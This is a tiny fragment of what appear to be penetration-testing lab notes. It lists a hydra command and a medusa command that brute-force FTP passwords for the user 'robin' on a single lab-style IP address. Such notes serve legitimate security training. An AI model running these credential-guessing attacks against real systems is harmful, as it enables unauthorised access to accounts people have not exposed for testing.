
### Brute Force

```bash
hydra -t 4 -l robin -P passwords.list ftp://10.129.203.6
```

#### Medusa Brute Force
```shell-session
medusa -u robin -P ./passwords.list -h 10.129.203.6 -M ftp -n 443
```